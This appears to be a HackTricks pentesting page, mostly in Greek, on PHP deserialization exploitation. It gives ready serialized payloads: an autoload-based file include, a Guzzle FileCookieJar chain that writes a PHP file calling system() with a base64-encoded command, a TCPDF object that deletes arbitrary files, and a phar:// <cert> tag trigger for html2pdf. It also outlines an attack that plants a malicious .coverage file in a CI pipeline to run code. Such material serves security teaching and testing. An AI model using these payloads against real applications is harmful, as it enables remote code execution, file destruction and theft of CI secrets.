# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

Πρώτα, πρέπει να ελέγξεις τι είναι [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserialization + spl_autoload_register + LFI/Gadget

Βρισκόμασταν σε μια κατάσταση όπου βρέθηκε ένα **PHP deserialization in a webapp** χωρίς κάποια βιβλιοθήκη ευάλωτη σε gadgets μέσα στο **`phpggc`**. Ωστόσο, στον ίδιο container υπήρχε ένα **different composer webapp with vulnerable libraries**. Συνεπώς, ο στόχος ήταν να **load the composer loader of the other webapp** και να τον καταχραστούμε ώστε να **load a gadget that will exploit that library with a gadget** από το webapp που είναι ευάλωτο σε deserialization.

Βήματα:

- Έχεις βρει ένα **deserialization** και **there isn’t any gadget** στον τρέχοντα κώδικα της εφαρμογής
- Μπορείς να καταχραστείς μια συνάρτηση **`spl_autoload_register`** όπως η παρακάτω για να **load any local file with `.php` extension**
- Για αυτό χρησιμοποιείς μια deserialization όπου το όνομα της κλάσης θα βρίσκεται μέσα στο **`$name`**. You **cannot use "/" or "."** σε ένα όνομα κλάσης σε ένα serialized αντικείμενο, αλλά ο **code** είναι **replacing** τα **underscores** ("_") **for slashes** ("/"). Έτσι ένα όνομα κλάσης όπως `tmp_passwd` θα μετατραπεί σε `/tmp/passwd.php` και ο κώδικας θα προσπαθήσει να το φορτώσει.\
A **gadget example** θα είναι: **`O:10:"tmp_passwd":0:{}`**

<details>
<summary>spl_autoload_register LFI/autoload example</summary>
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
</details>

> [!TIP]
> Εάν έχετε ένα **file upload** και μπορείτε να ανεβάσετε ένα αρχείο με **`.php` extension** μπορείτε να **εκμεταλλευτείτε άμεσα αυτή τη λειτουργία** και να αποκτήσετε RCE.

Στην περίπτωσή μου, δεν είχα κάτι τέτοιο, αλλά υπήρχε μέσα στον **same container** μια άλλη composer web σελίδα με μια **βιβλιοθήκη ευάλωτη σε `phpggc` gadget**.

- Για να φορτώσετε αυτή την άλλη βιβλιοθήκη, πρώτα πρέπει να **φορτώσετε τον composer loader της άλλης web εφαρμογής** (επειδή ο loader της τρέχουσας εφαρμογής δεν θα έχει πρόσβαση στις βιβλιοθήκες της άλλης). **Γνωρίζοντας το path της εφαρμογής**, μπορείτε να το επιτύχετε πολύ εύκολα με: **`O:28:"www_frontend_vendor_autoload":0:{}`** (Στην περίπτωσή μου, ο composer loader ήταν στο `/www/frontend/vendor/autoload.php`)
- Τώρα, μπορείτε να **φορτώσετε** τον composer loader της άλλης εφαρμογής, οπότε είναι ώρα να **`generate the phpgcc`** **payload** που θα χρησιμοποιήσετε. Στην περίπτωσή μου, χρησιμοποίησα **`Guzzle/FW1`**, που μου επέτρεπε να **γράψω οποιοδήποτε αρχείο στο filesystem**.
- NOTE: Το παραγόμενο gadget δεν λειτουργούσε — για να δουλέψει τροποποίησα εκείνο το payload **`chain.php`** του phpggc και έκανα όλα τα attributes των κλάσεων **από private σε public**. Διαφορετικά, μετά την αποσειριοποίηση του string, τα attributes των δημιουργημένων αντικειμένων δεν είχαν τιμές.
- Τώρα έχουμε τον τρόπο να **φορτώσουμε τον composer loader της άλλης εφαρμογής** και να έχουμε ένα **phpggc payload που λειτουργεί**, αλλά πρέπει να **το κάνουμε στο SAME REQUEST για να φορτωθεί ο loader όταν χρησιμοποιηθεί το gadget**. Για αυτό, έστειλα έναν σειριοποιημένο array με και τα δύο αντικείμενα ως εξής:
- Μπορείτε να δείτε **πρώτα τον loader να φορτώνεται και μετά το payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- Τώρα, μπορούμε να **δημιουργήσουμε και να γράψουμε ένα αρχείο**, όμως ο χρήστης **δεν μπορούσε να γράψει σε κανέναν φάκελο μέσα στον web server**. Έτσι, όπως βλέπετε στο payload, το PHP που καλεί **`system`** με κάποιο **base64** δημιουργείται στο **`/tmp/a.php`**. Στη συνέχεια, μπορούμε να **επανχρησιμοποιήσουμε τον πρώτο τύπο payload** που χρησιμοποιήσαμε ως LFI για να φορτώσουμε τον composer loader της άλλης webapp ώστε **να φορτώσει το δημιουργημένο `/tmp/a.php`** αρχείο. Απλώς προσθέστε το στο deserialization gadget:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{} }
```
**Περίληψη του payload**

- **Φόρτωση του composer autoload** ενός διαφορετικού webapp στον ίδιο container
- **Φόρτωση ενός phpggc gadget** για εκμετάλλευση μιας βιβλιοθήκης από το άλλο webapp (η αρχική webapp που ήταν ευάλωτη σε deserialization δεν είχε κανένα gadget στις βιβλιοθήκες της)
- Το gadget θα **δημιουργήσει ένα αρχείο με ένα PHP payload** στο /tmp/a.php με κακόβουλες εντολές (ο χρήστης του webapp δεν μπορεί να γράψει σε κανέναν φάκελο οποιουδήποτε webapp)
- Το τελικό μέρος του payload μας θα χρησιμοποιήσει **να φορτώσει το παραγόμενο php αρχείο** που θα εκτελέσει εντολές

Έπρεπε να **καλέσω αυτή την deserialization δύο φορές**. Στις δοκιμές μου, την πρώτη φορά το αρχείο `/tmp/a.php` δημιουργήθηκε αλλά δεν φορτώθηκε, και τη δεύτερη φορτώθηκε σωστά.

### Πρόσφατα phpggc goodies (2025)

- Το **master branch του phpggc συνεχίζει να προσθέτει chains**: OpenCart/RCE2, Drupal/FD1/SQLI1/XXE1, WordPress/YoastSEO/FW1 και άλλα προστέθηκαν το 2025 — χρήσιμα όταν η στοχευμένη εφαρμογή μοιράζεται vendor code με αυτά τα projects. Ένας γρήγορος τρόπος για να ψάξετε είναι `phpggc -l | grep -E "OpenCart|Drupal|Yoast"` (update your clone first).
- Όταν αναμειγνύεις gadgets μεταξύ εφαρμογών μέσω autoloading, να θυμάσαι ότι **οι private ιδιότητες στις ορισμούς των gadget μπορεί να απορριφθούν** όταν οι κλάσεις επαναδηλωθούν διαφορετικά στον στόχο; επεξεργάσου το `chain.php` του gadget για να κάνεις τις ιδιότητες `public` αν το payload φτάνει με κενές τιμές (ίδιο κόλπο όπως παραπάνω).

## Deserialization από PHPUnit PHPT coverage (CI/CD entrypoint)

`phpunit` πριν από **8.5.52 / 9.6.34 / 10.5.63 / 11.5.50 / 12.5.8** (CVE-2026-24765) αποσειριοποιούσε αυθαίρετα PHP αντικείμενα από αρχεία `.coverage` που παράγονται από τον **PHPT runner**. Σε CI pipelines όπου μη έμπιστοι συνεισφέροντες μπορούν να σπρώξουν tests, τοποθετώντας ένα κακουργημένο `.coverage` αρχείο ενεργοποιεί αποσειριοποίηση μόλις τρέξει το suite — δεν απαιτείται πρόσβαση web.

**Ροή επίθεσης**

1. Τοποθετήστε ένα κακόβουλο `.coverage` αρχείο στο repo (ή artifact) που περιέχει ένα σειριοποιημένο gadget που υπάρχει στις εξαρτήσεις των tests (π.χ. μια αλυσίδα Monolog ή Guzzle από phpggc).
2. Υποβάλετε ένα PR; όταν το CI εκτελέσει `phpunit --configuration phpunit.xml`, ο PHPT runner διαβάζει το coverage αρχείο και αποσειριοποιεί το gadget, δίνοντας **RCE μέσα στο runner container**.
3. Αυτό είναι ιδιαίτερα επικίνδυνο όταν τα tests προσαρτούν CI secrets (cloud creds, deployment keys).

**Ελάχιστο κακόβουλο coverage stub** (τοποθετήστε μαζί με ένα PHPT test):
```php
<?php
$payload = file_get_contents('php://stdin'); // serialized gadget from phpggc
file_put_contents('exploit.coverage', $payload);
```
Run the PHPT so phpunit consumes `exploit.coverage`.

## TCPDF `__destruct` POP chain για αυθαίρετη διαγραφή αρχείων

Όταν ένα πραγματικό instance του `TCPDF` συλλεχθεί από τον garbage collector, καλεί `_destroy(true)`, διατρέχει `$this->imagekeys` και κάνει `unlink()` οτιδήποτε μοιάζει με αρχείο cache κάτω από `K_PATH_CACHE`. Αν μια εφαρμογή εκτελεί `unserialize($user_data)` ενώ η κλάση `TCPDF` είναι φορτωμένη (π.χ. αναμένει έναν πίνακα με κλειδί `html`), μπορείτε να παρέχετε ένα σειριακοποιημένο αντικείμενο που ορίζει:

- `file_id` σε οποιονδήποτε ακέραιο που δεν υπάρχει σε `self::$cleaned_ids` (π.χ. `-1`).
- `imagekeys` σε διαδρομές που ξεκινούν με `K_PATH_CACHE` ή που μπορούν να γίνουν να μοιάζουν έτσι (π.χ. `/tmp/../tmp/do_not_delete_this_file.txt` όταν `K_PATH_CACHE` είναι `/tmp/`).

Παράδειγμα payload που χτυπά μια μη ασφαλή ροή `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);`:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
Το αρχείο διαγράφεται μόλις το αντικείμενο βγει εκτός εμβέλειας. TCPDF 6.9.3 έσφιξε τον έλεγχο ώστε να αφαιρεί μόνο paths με το πρόθεμα `__tcpdf_<file_id>_` μέσα στο `K_PATH_CACHE` και εισήγαγε `_unlink()` για να μπλοκάρει μη-`file://` schemes, οπότε οι παλαιότερες εκδόσεις Producer είναι prime targets.

### Triggering the gadget via `phar://` in html2pdf `<cert>` tags

`spipu/html2pdf` (≤5.3.0) wraps TCPDF και εκθέτει ένα custom `<cert>` block του οποίου τα attributes `src`/`privkey` επικυρώνονται με plain `file_exists()`. Σε PHP < 8.0 οποιαδήποτε filesystem function που αγγίζει ένα `phar://` URL προκαλεί το Phar metadata να γίνει unserialized. Αποθηκεύοντας το malicious αντικείμενο TCPDF πιο πάνω μέσα σε ένα Phar archive κερδίζεις ένα reliable POP ακόμα κι αν η εφαρμογή δεν καλεί ποτέ την `unserialize()`.

1. Craft ένα Phar με `phar.readonly=0`, set το stub/manifest να μοιάζει με εικόνα (π.χ. μετονομασία `archive.phar` σε `archive.png`), και store το serialized αντικείμενο TCPDF στο Phar metadata.
2. Upload/τοποθετήστε το αρχείο κάπου προσβάσιμο όπως `/tmp/user_files/user_1/archive.png`.
3. Submit HTML που περιέχει το CERT tag ώστε το html2pdf να επιλύσει το attacker-controlled path:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
Η κλήση στη `file_exists()` αποσειριοποιεί τα μεταδεδομένα, δημιουργεί στιγμιότυπο του TCPDF, και ο destructor του διαγράφει το επιλεγμένο αρχείο, μετατρέποντας το html2pdf σε ένα ισχυρό `phar://` σημείο εισόδου. Η έκδοση 5.3.1 πρόσθεσε τη `Security::checkValidPath()` για να μπλοκάρει μη εγκεκριμένα schemes, οπότε οι παλαιότερες εγκαταστάσεις παραμένουν ελκυστικές.

## Αναφορές

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [GitLab Advisory – CVE-2024-51058 TCPDF Hash Comparison / Phar Deserialization](https://advisories.gitlab.com/pkg/composer/tecnickcom/tcpdf/)
- [CVE-2026-24765 – PHPUnit PHPT Coverage Unsafe Deserialization](https://cvereports.com/reports/CVE-2026-24765)

{{#include ../../banners/hacktricks-training.md}}
